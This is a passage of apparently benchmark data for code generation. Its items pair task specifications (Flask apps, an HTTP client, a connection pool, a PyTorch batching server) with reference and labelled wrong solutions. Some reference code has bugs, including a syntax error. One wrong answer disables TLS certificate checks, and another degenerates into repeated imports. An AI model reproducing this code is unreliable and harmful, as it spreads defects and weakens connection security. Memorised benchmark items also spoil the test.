    "Canonical_solution": "from flask import Flask\nfrom flask import request\nimport os\nimport requests\nimport json\n\nclass WhatsAppClient:\n    API_URL = \"https://graph.facebook.com/v17.0/\"\n    WHATSAPP_API_TOKEN = \"<Temporary access token from your WhatsApp API Setup>\"\n    WHATSAPP_CLOUD_NUMBER_ID = \"<Phone number ID from your WhatsApp API Setup>\"\n\n    def __init__(self):\n        self.headers = {\n            \"Authorization\": f\"Bearer {self.WHATSAPP_API_TOKEN}\",\n            \"Content-Type\": \"application/json\",\n        }\n        self.API_URL = self.API_URL + self.WHATSAPP_CLOUD_NUMBER_ID\n\n    def send_text_message(self, message, phone_number):\n        payload = {\n            \"messaging_product\": 'whatsapp',\n            \"to\": phone_number,\n            \"type\": \"text\",\n            \"text\": {\n                \"preview_url\": False,\n                \"body\": message\n            }\n        }\n        response = requests.post(f\"{self.API_URL}/messages\", json=payload, headers=self.headers)\n        print(response.status_code)\n        assert response.status_code == 200, \"Error sending message\"\n        return response.status_code\n\napp = Flask(__name__)\n\n@app.route('/msgrcvd', methods=['POST', 'GET'])\ndef msgrcvd():\n    message = request.args.get('message')\n    answer = llm(message)\n    print(message)\n    print(answer)\n    client.send_text_message(llm(message), \"<your phone number>\")\n    return message + \"<p/>\" + answer",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nclass WhatsAppClient:\n    API_URL = \"https://graph.facebook.com/v17.0/\"\n    def __init__(self, WHATSAPP_API_TOKEN, WHATSAPP_CLOUD_NUMBER_ID):\n        self.WHATSAPP_API_TOKEN = WHATSAPP_API_TOKEN\n        self.WHATSAPP_CLOUD_NUMBER_ID = WHATSAPP_CLOUD_NUMBER_ID\n        self.headers = {\n            \"Authorization\": f\"Bearer {self.WHATSAPP_API_TOKEN}\",\n            \"Content-Type\": \"application/json\"\n        }\n        self.base_url = f\"{self.API_URL}{self.WHATSAPP_CLOUD_NUMBER_ID}/messages\"\n\n    def send_text_message(self, message, phone_number):\n        payload = {\n            \"messaging_product\": \"whatsapp\",\n            \"recipient_type\": \"individual\",\n            \"to\": phone_number,\n            \"type\": \"text\",\n            \"text\": {\n                \"body\": message\n            }\n        }\n        response = requests.post(self.base_url, headers=self.headers, json=payload)\n        return response.status_code\n```\n"
  },
  {
    "Task_id": 199,
    "Instruction": "Task Description: Create a Flask-based HTTP server to visualize and navigate through a robot dataset, allowing users to view different episodes and associated metadata.\n\nFunction Description: The `run_server` function initializes and runs a Flask web server that provides a user interface for exploring robot datasets. It handles dataset navigation, episode selection, and displays relevant information including videos and task descriptions. The server supports both local datasets and remote datasets hosted on Hugging Face.\n\nInput:\n- dataset: Union[LeRobotDataset, IterableNamespace, None] - The dataset to visualize (can be None if loading from URL)\n- episodes: Optional[List[int]] - List of episode IDs to make available (None for all episodes)\n- host: str - Host address to run the server on\n- port: str - Port number to run the server on\n- static_folder: Path - Path to static files directory\n- template_folder: Path - Path to HTML templates directory\n\nOutput: None (runs a Flask server indefinitely until interrupted)\n\nMethods (route handlers):\n1. homepage() -> Union[Redirect, Response] - Handles root URL, redirects to first episode or shows dataset selection page\n2. show_first_episode(dataset_namespace: str, dataset_name: str) -> Redirect - Redirects to the first episode of a specified dataset\n3. show_episode(dataset_namespace: str, dataset_name: str, episode_id: int) -> Union[Response, Tuple[str, int]] - Displays detailed information for a specific episode including videos and task data\n\nThe server provides the following features:\n- Dataset version validation\n- Episode navigation\n- Video playback\n- Task description display\n- Data visualization\n- Support for both local and remote datasets\n- Featured datasets showcase",
    "Canonical_solution": "import argparse\nimport json\nimport logging\nimport re\nimport shutil\nimport tempfile\nfrom pathlib import Path\n\nimport requests\nfrom flask import Flask, redirect, render_template, request, url_for\n\ndef run_server(\n    dataset: LeRobotDataset | IterableNamespace | None,\n    episodes: list[int] | None,\n    host: str,\n    port: str,\n    static_folder: Path,\n    template_folder: Path,\n):\n    app = Flask(__name__, static_folder=static_folder.resolve(), template_folder=template_folder.resolve())\n    app.config[\"SEND_FILE_MAX_AGE_DEFAULT\"] = 0  # specifying not to cache\n\n    @app.route(\"/\")\n    def hommepage(dataset=dataset):\n        if dataset:\n            dataset_namespace, dataset_name = dataset.repo_id.split(\"/\")\n            return redirect(\n                url_for(\n                    \"show_episode\",\n                    dataset_namespace=dataset_namespace,\n                    dataset_name=dataset_name,\n                    episode_id=0,\n                )\n            )\n\n        dataset_param, episode_param = None, None\n        all_params = request.args\n        if \"dataset\" in all_params:\n            dataset_param = all_params[\"dataset\"]\n        if \"episode\" in all_params:\n            episode_param = int(all_params[\"episode\"])\n\n        if dataset_param:\n            dataset_namespace, dataset_name = dataset_param.split(\"/\")\n            return redirect(\n                url_for(\n                    \"show_episode\",\n                    dataset_namespace=dataset_namespace,\n                    dataset_name=dataset_name,\n                    episode_id=episode_param if episode_param is not None else 0,\n                )\n            )\n\n        featured_datasets = [\n            \"lerobot/aloha_static_cups_open\",\n            \"lerobot/columbia_cairlab_pusht_real\",\n            \"lerobot/taco_play\",\n        ]\n        return render_template(\n            \"visualize_dataset_homepage.html\",\n            featured_datasets=featured_datasets,\n            lerobot_datasets=available_datasets,\n        )\n\n    @app.route(\"/<string:dataset_namespace>/<string:dataset_name>\")\n    def show_first_episode(dataset_namespace, dataset_name):\n        first_episode_id = 0\n        return redirect(\n            url_for(\n                \"show_episode\",\n                dataset_namespace=dataset_namespace,\n                dataset_name=dataset_name,\n                episode_id=first_episode_id,\n            )\n        )\n\n    @app.route(\"/<string:dataset_namespace>/<string:dataset_name>/episode_<int:episode_id>\")\n    def show_episode(dataset_namespace, dataset_name, episode_id, dataset=dataset, episodes=episodes):\n        repo_id = f\"{dataset_namespace}/{dataset_name}\"\n        try:\n            if dataset is None:\n                dataset = get_dataset_info(repo_id)\n        except FileNotFoundError:\n            return (\n                \"Make sure to convert your LeRobotDataset to v2 & above. See how to convert your dataset at https://github.com/huggingface/lerobot/pull/461\",\n                400,\n            )\n        dataset_version = (\n            dataset.meta._version if isinstance(dataset, LeRobotDataset) else dataset.codebase_version\n        )\n        match = re.search(r\"v(\\d+)\\.\", dataset_version)\n        if match:\n            major_version = int(match.group(1))\n            if major_version < 2:\n                return \"Make sure to convert your LeRobotDataset to v2 & above.\"\n\n        episode_data_csv_str, columns = get_episode_data(dataset, episode_id)\n        dataset_info = {\n            \"repo_id\": f\"{dataset_namespace}/{dataset_name}\",\n            \"num_samples\": dataset.num_frames\n            if isinstance(dataset, LeRobotDataset)\n            else dataset.total_frames,\n            \"num_episodes\": dataset.num_episodes\n            if isinstance(dataset, LeRobotDataset)\n            else dataset.total_episodes,\n            \"fps\": dataset.fps,\n        }\n        if isinstance(dataset, LeRobotDataset):\n            video_paths = [\n                dataset.meta.get_video_file_path(episode_id, key) for key in dataset.meta.video_keys\n            ]\n            videos_info = [\n                {\"url\": url_for(\"static\", filename=video_path), \"filename\": video_path.parent.name}\n                for video_path in video_paths\n            ]\n            tasks = dataset.meta.episodes[0][\"tasks\"]\n        else:\n            video_keys = [key for key, ft in dataset.features.items() if ft[\"dtype\"] == \"video\"]\n            videos_info = [\n                {\n                    \"url\": f\"https://huggingface.co/datasets/{repo_id}/resolve/main/\"\n                    + dataset.video_path.format(\n                        episode_chunk=int(episode_id) // dataset.chunks_size,\n                        video_key=video_key,\n                        episode_index=episode_id,\n                    ),\n                    \"filename\": video_key,\n                }\n                for video_key in video_keys\n            ]\n\n            response = requests.get(\n                f\"https://huggingface.co/datasets/{repo_id}/resolve/main/meta/episodes.jsonl\"\n            )\n            response.raise_for_status()\n            # Split into lines and parse each line as JSON\n            tasks_jsonl = [json.loads(line) for line in response.text.splitlines() if line.strip()]\n\n            filtered_tasks_jsonl = [row for row in tasks_jsonl if row[\"episode_index\"] == episode_id]\n            tasks = filtered_tasks_jsonl[0][\"tasks\"]\n\n        videos_info[0][\"language_instruction\"] = tasks\n\n        if episodes is None:\n            episodes = list(\n                range(dataset.num_episodes if isinstance(dataset, LeRobotDataset) else dataset.total_episodes)\n            )\n\n        return render_template(\n            \"visualize_dataset_template.html\",\n            episode_id=episode_id,\n            episodes=episodes,\n            dataset_info=dataset_info,\n            videos_info=videos_info,\n            episode_data_csv_str=episode_data_csv_str,\n            columns=columns,\n        )\n\n    app.run(host=host, port=port)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom typing import Union, Optional, List, Tuple\nfrom pathlib import Path\nfrom flask import Flask, Response, redirect, render_template, request, url_for\nfrom le_robot_dataset import LeRobotDataset, IterableNamespace\n\napp = Flask(__name__, static_folder=\"static\", template_folder=\"templates\")\n\n@app.route(\"/\")\ndef homepage() -> Union[Redirect, Response]:\n    if dataset is None:\n        return render_template(\"dataset_selection.html\")\n    else:\n        return redirect(url_for(\"show_first_episode\", dataset_namespace=dataset_namespace, dataset_name=dataset_name))\n\n@app.route(\"/<dataset_namespace>/<dataset_name>/\")\ndef show_first_episode(dataset_namespace: str, dataset_name: str) -> Redirect:\n    return redirect(url_for(\"show_episode\", dataset_namespace=dataset_namespace, dataset_name=dataset_name, episode_id=0))\n\n@app.route(\"/<dataset_namespace>/<dataset_name>/<int:episode_id>\")\ndef show_episode(dataset_namespace: str, dataset_name: str, episode_id: int) -> Union[Response, Tuple[str, int]]:\n    if dataset is None:\n        return \"Dataset not found\", 404\n    if episode_id < 0 or episode_id >= len(dataset):\n        return \"Episode not found\", 404\n    episode = dataset[episode_id]\n    return render_template(\"episode.html\", episode=episode, episode_id=episode_id, dataset_name=dataset_name, dataset_namespace=dataset_namespace)\n\nif __name__ == \"__main__\":\n    app.run(host=host, port=port)\n```\n"
  },
  {
    "Task_id": 20,
    "Instruction": "Task Description: Create a Python function that performs HTTP requests using the http.client library, supporting both HTTP and HTTPS protocols, with optional proxy configuration and proper error handling.\n\nFunction Description: The function performs HTTP requests (GET/POST) to a specified endpoint with given parameters. It handles connection setup (with or without proxy), request sending, response processing, and connection cleanup. It supports both Python 2 and 3 compatibility and includes logging for debugging purposes.\n\nInput:\n- method: [str] - HTTP method to use ('GET' or 'POST')\n- action: [str] - URL path/endpoint to request\n- param: [dict] - Optional dictionary of parameters (default: None)\n- **params: [dict] - Additional parameters as keyword arguments\n\nOutput:\n- Returns: [str] - Response body as string if successful (status code 2xx)\n- Raises: [Exception] - If HTTP status code indicates failure (non-2xx)",
    "Canonical_solution": "from json import loads as jsondecode\nfrom logging import debug, info, warning\ntry:\n    # python 2\n    from httplib import HTTPSConnection, HTTPConnection\n    from urlparse import urlparse, parse_qsl\n    from urllib import urlencode\nexcept ImportError:\n    # python 3\n    from http.client import HTTPSConnection, HTTPConnection\n    from urllib.parse import urlencode, urlparse, parse_qsl\n\nclass Config:\n    ID = None\n    TOKEN = None\n    PROXY = None\n    TTL = None\n\ndef request(method, action, param=None, **params):\n    if param:\n        params.update(param)\n\n    URLObj = urlparse(Config.ID)\n    params = dict((k, params[k]) for k in params if params[k] is not None)\n    info(\"%s/%s : %s\", URLObj.netloc, action, params)\n\n    if Config.PROXY:\n        if URLObj.netloc == \"http\":\n            conn = HTTPConnection(Config.PROXY)\n        else:\n            conn = HTTPSConnection(Config.PROXY)\n        conn.set_tunnel(URLObj.netloc, URLObj.port)\n    else:\n        if URLObj.netloc == \"http\":\n            conn = HTTPConnection(URLObj.netloc, URLObj.port)\n        else:\n            conn = HTTPSConnection(URLObj.netloc, URLObj.port)\n\n    headers = {}\n\n    if method == \"GET\":\n        if params:\n            action += '?' + urlencode(params)\n        params = \"\"\n    else:\n        headers[\"Content-Type\"] = \"application/x-www-form-urlencoded\"\n\n    params = urlencode(params)\n\n    conn.request(method, action, params, headers)\n    response = conn.getresponse()\n    res = response.read().decode('utf8')\n    conn.close()\n    if response.status < 200 or response.status >= 300:\n        warning('%s : error[%d]:%s', action, response.status, res)\n        raise Exception(res)\n    else:\n        debug('%s : result:%s', action, res)\n        return res",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport http.client\nimport logging\nimport urllib.parse\nimport ssl\n\ndef http_request(method, action, param=None, **params):\n    if param is None:\n        param = {}\n    param.update(params)\n    url = urllib.parse.urlparse(action)\n    if url.scheme == 'https':\n        conn = http.client.HTTPSConnection(url.netloc, context=ssl._create_unverified_context())\n    else:\n        conn = http.client.HTTPConnection(url.netloc)\n    headers = {'Content-type': 'application/x-www-form-urlencoded'}\n    if method == 'GET':\n        action += '?' + urllib.parse.urlencode(param)\n    else:\n        headers['Content-length'] = str(len(urllib.parse.urlencode(param)))\n    conn.request(method, action, urllib.parse.urlencode(param), headers)\n    response = conn.getresponse()\n    if response.status // 100 != 2:\n        raise Exception('HTTP request failed with status code: %d' % response.status)\n    return response.read().decode('utf-8')\n```"
  },
  {
    "Task_id": 208,
    "Instruction": "Task Description: Create a Python class that manages a queue-based system for processing image style transfer requests using a pre-trained PyTorch model, with asynchronous batch processing capabilities.\n\nClass Description: ModelRunner is a class that handles asynchronous processing of image style transfer requests using a PyTorch model. It manages a queue system with configurable batch processing, queue limits, and wait times to efficiently process incoming requests.\n\nAttributes:\n- model_name: str - Path to the pre-trained PyTorch model file\n- queue: list - Stores pending processing tasks\n- queue_lock: asyncio.Lock - Synchronization lock for queue access\n- model: torch.jit.ScriptModule - Loaded PyTorch model\n- needs_processing: asyncio.Event - Signals when processing is needed\n- needs_processing_timer: asyncio.TimerHandle - Timer for delayed processing\n\nMethods:\n- __init__(model_name: str) -> None - Initializes the model runner with the specified model file\n- schedule_processing_if_needed() -> None - Checks queue and triggers processing if conditions are met\n- process_input(input: torch.Tensor) -> torch.Tensor - Adds input to queue and waits for processed output\n- run_model(batch: torch.Tensor) -> torch.Tensor - Executes the model on the input batch (synchronous)\n- model_runner() -> None - Main processing loop that handles batch processing asynchronously",
    "Canonical_solution": "import sys\nimport asyncio\nimport functools\nfrom sanic import Sanic\nfrom sanic.response import raw, text\nfrom sanic.log import logger\nimport sanic\nimport torch\nimport torchvision\nimport PIL.Image\nimport io\n\nclass ModelRunner:\n    def __init__(self, model_name):\n        self.model_name = model_name\n        self.queue = []\n        self.queue_lock = None\n        self.model = torch.jit.load(self.model_name, map_location=torch.device('cpu'))\n        self.needs_processing = None\n        self.needs_processing_timer = None\n\n    def schedule_processing_if_needed(self):\n        if len(self.queue) >= 2:  # MAX_BATCH_SIZE\n            logger.debug(\"next batch ready when processing a batch\")\n            self.needs_processing.set()\n        elif self.queue:\n            logger.debug(\"queue nonempty when processing a batch, setting next timer\")\n            self.needs_processing_timer = app.loop.call_at(self.queue[0][\"time\"] + 1, self.needs_processing.set)  # MAX_WAIT\n\n    async def process_input(self, input):\n        our_task = {\"done_event\": asyncio.Event(loop=app.loop),\n                    \"input\": input,\n                    \"time\": app.loop.time()}\n        async with self.queue_lock:\n            if len(self.queue) >= 3:  # MAX_QUEUE_SIZE\n                raise HandlingError(\"I'm too busy\", code=503)\n            self.queue.append(our_task)\n            logger.debug(\"enqueued task. new queue size {}\".format(len(self.queue)))\n            self.schedule_processing_if_needed()\n        await our_task[\"done_event\"].wait()\n        return our_task[\"output\"]\n\n    def run_model(self, batch):\n        return self.model(batch.to(torch.device('cpu'))).to('cpu')\n\n    async def model_runner(self):\n        self.queue_lock = asyncio.Lock(loop=app.loop)\n        self.needs_processing = asyncio.Event(loop=app.loop)\n        logger.info(\"started model runner for {}\".format(self.model_name))\n        while True:\n            await self.needs_processing.wait()\n            self.needs_processing.clear()\n            if self.needs_processing_timer is not None:\n                self.needs_processing_timer.cancel()\n                self.needs_processing_timer = None\n            async with self.queue_lock:\n                if self.queue:\n                    longest_wait = app.loop.time() - self.queue[0][\"time\"]\n                else:\n                    longest_wait = None\n                logger.debug(\"launching processing. queue size: {}. longest wait: {}\".format(len(self.queue), longest_wait))\n                to_process = self.queue[:2]  # MAX_BATCH_SIZE\n                del self.queue[:len(to_process)]\n                self.schedule_processing_if_needed()\n            batch = torch.stack([t[\"input\"] for t in to_process], dim=0)\n            result = await app.loop.run_in_executor(\n                None, functools.partial(self.run_model, batch)\n            for t, r in zip(to_process, result):\n                t[\"output\"] = r\n                t[\"done_event\"].set()\n            del to_process\n\nclass HandlingError(Exception):\n    def __init__(self, msg, code=500):\n        super().__init__()\n        self.handling_code = code\n        self.handling_msg = msg\n\napp = Sanic(__name__)\n\n@app.route('/image', methods=['PUT'], stream=True)\nasync def image(request):\n    try:\n        content_length = int(request.headers.get('content-length', '0'))\n        MAX_SIZE = 2**22\n        if content_length:\n            if content_length > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n            data = bytearray(content_length)\n        else:\n            data = bytearray(MAX_SIZE)\n        pos = 0\n        while True:\n            data_part = await request.stream.read()\n            if data_part is None:\n                break\n            data[pos: len(data_part) + pos] = data_part\n            pos += len(data_part)\n            if pos > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n\n        im = PIL.Image.open(io.BytesIO(data))\n        im = torchvision.transforms.functional.resize(im, (228, 228))\n        im = torchvision.transforms.functional.to_tensor(im)\n        im = im[:3]\n        if im.dim() != 3 or im.size(0) < 3 or im.size(0) > 4:\n            raise HandlingError(\"need rgb image\")\n        out_im = await style_transfer_runner.process_input(im)\n        out_im = torchvision.transforms.functional.to_pil_image(out_im)\n        imgByteArr = io.BytesIO()\n        out_im.save(imgByteArr, format='JPEG')\n        return raw(imgByteArr.getvalue(), status=200, content_type='image/jpeg')\n    except HandlingError as e:\n        return text(e.handling_msg, status=e.handling_code)\n\nstyle_transfer_runner = ModelRunner(sys.argv[1])\napp.add_task(style_transfer_runner.model_runner())",
    "Code_level": "Class-level",
    "FSMID_for_test": 62,
    "wrong_result": "```python\nimport asyncio\nimport torch\nfrom torch import jit\n\nclass ModelRunner:\n    def __init__(self, model_name: str):\n        self.model_name = model_name\n        self.queue = []\n        self.queue_lock = asyncio.Lock()\n        self.model = jit.load(self.model_name)\n        self.needs_processing = asyncio.Event()\n        self.needs_processing_timer = None\n\n    async def schedule_processing_if_needed(self):\n        async with self.queue_lock:\n            if len(self.queue) >= 1:\n                if self.needs_processing_timer is not None:\n                    self.needs_processing_timer.cancel()\n                self.needs_processing.set()\n\n    async def process_input(self, input: torch.Tensor) -> torch.Tensor:\n        async with self.queue_lock:\n            self.queue.append(input)\n            await self.schedule_processing_if_needed()\n        await self.needs_processing.wait()\n        async with self.queue_lock:\n            output = self.queue.pop(0)\n            if len(self.queue) > 0:\n                self.needs_processing.set()\n            else:\n                self.needs_processing.clear()\n        return output\n\n    def run_model(self, batch: torch.Tensor) -> torch.Tensor:\n        return self.model(batch)\n\n    async def model_runner(self):\n        while True:\n            await self.needs_processing.wait()\n            async with self.queue_lock:\n                if len(self.queue) > 0:\n                    batch = torch.stack(self.queue)\n                    self.queue = []\n                    self.needs_processing.clear()\n                    output = self.run_model(batch)\n                    for i, item in enumerate(output):\n                        await self.process_input(item)\n                else:\n                    self.needs_processing.clear()\n```\n"
  },
  {
    "Task_id": 21,
    "Instruction": "Task Description: Implement a connection pooling system for HTTP and HTTPS connections to efficiently manage and reuse connections to a target server.\n\nClass Description: HTTPConnectionPool is a connection pool implementation that manages HTTP connections to a specific host and port. It provides methods to get, put, and make requests using connections from the pool.\n\nAttributes:\n- scheme: str - The URL scheme (http or https)\n- host: str - The target host for connections\n- port: int - The target port for connections\n- timeout: Timeout - Connection and read timeout settings\n- retries: Retry - Retry configuration for failed requests\n- pool: LifoQueue - The connection pool storage (LIFO queue)\n- block: bool - Whether to block when pool is empty\n- proxy: str - Proxy server URL (optional)\n- proxy_headers: dict - Headers for proxy requests\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with configuration parameters\n- _new_conn() -> HTTPConnection - Creates a new connection instance\n- _get_conn(timeout=None) -> HTTPConnection - Gets a connection from the pool or creates a new one\n- _put_conn(conn) -> None - Returns a connection to the pool\n- _make_request(conn, method, url, timeout=_Default, **httplib_request_kw) -> HTTPResponse - Makes an HTTP request using the specified connection\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, **response_kw) -> HTTPResponse - Main method to make HTTP requests with connection pooling and retry logic\n- close() -> None - Closes all connections in the pool\n\nClass Description: HTTPSConnectionPool extends HTTPConnectionPool to handle HTTPS connections with SSL/TLS configuration.\n\nAttributes:\n- key_file: str - Path to client private key file\n- cert_file: str - Path to client certificate file\n- cert_reqs: str - Certificate requirements\n- ca_certs: str - Path to CA certificates file\n- ssl_version: str - SSL version to use\n- assert_hostname: str - Hostname to verify against certificate\n- assert_fingerprint: str - Expected certificate fingerprint\n\nMethods:\n- _prepare_conn(conn) -> HTTPSConnection - Configures SSL/TLS settings on a connection\n- _new_conn() -> HTTPSConnection - Creates a new HTTPS connection with SSL/TLS configuration",
    "Canonical_solution": "import socket\nimport errno\nfrom socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .util.timeout import Timeout\nfrom .util.retry import Retry\nfrom .util.url import parse_url\nfrom .exceptions import (\n    EmptyPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProtocolError,\n    ProxyError,\n    SSLError,\n    TimeoutError,\n    ClosedPoolError,\n    NewConnectionError\n)\nfrom .packages import six\nfrom .packages.six.moves import queue\nfrom .util.queue import LifoQueue\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        strict=False,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.pool = LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            strict=self.strict,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n            if conn and is_connection_dropped(conn):\n                conn.close()\n                conn = None\n            return conn or self._new_conn()\n        except queue.Empty:\n            raise EmptyPoolError(self, \"Pool is empty.\")\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            conn.close()\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n        conn.request(method, url, **httplib_request_kw)\n        return conn.getresponse()\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        release_conn=None,\n        **response_kw\n    ):\n        if retries is None:\n            retries = self.retries\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries)\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers\n            )\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=conn,\n                retries=retries,\n                **response_kw\n            )\n            return response\n        except (SocketError, ProtocolError) as e:\n            retries = retries.increment(method, url, error=e, _pool=self)\n            retries.sleep()\n            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries,\n                redirect,\n                assert_same_host,\n                timeout,\n                pool_timeout,\n                release_conn,\n                **response_kw\n            )\n\n    def close(self):\n        while True:\n            try:\n                conn = self.pool.get(block=False)\n                conn.close()\n            except queue.Empty:\n                break\n\nclass HTTPSConnectionPool(HTTPConnectionPool):\n    scheme = \"https\"\n    ConnectionCls = HTTPSConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        strict=False,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        key_file=None,\n        cert_file=None,\n        cert_reqs=None,\n        ca_certs=None,\n        ssl_version=None,\n        assert_hostname=None,\n        assert_fingerprint=None,\n        **conn_kw\n    ):\n        super(HTTPSConnectionPool, self).__init__(\n            host,\n            port,\n            strict,\n            timeout,\n            maxsize,\n            block,\n            headers,\n            retries,\n            _proxy,\n            _proxy_headers,\n            **conn_kw\n        )\n        self.key_file = key_file\n        self.cert_file = cert_file\n        self.cert_reqs = cert_reqs\n        self.ca_certs = ca_certs\n        self.ssl_version = ssl_version\n        self.assert_hostname = assert_hostname\n        self.assert_fingerprint = assert_fingerprint\n\n    def _prepare_conn(self, conn):\n        conn.set_cert(\n            key_file=self.key_file,\n            cert_file=self.cert_file,\n            cert_reqs=self.cert_reqs,\n            ca_certs=self.ca_certs,\n            assert_hostname=self.assert_hostname,\n            assert_fingerprint=self.assert_fingerprint\n        )\n        conn.ssl_version = self.ssl_version\n        return conn\n\n    def _new_conn(self):\n        conn = super(HTTPSConnectionPool, self)._new_conn()\n        return self._prepare_conn(conn)",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nfrom queue import LifoQueue\nfrom http.client import HTTPConnection, HTTPSConnection\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom 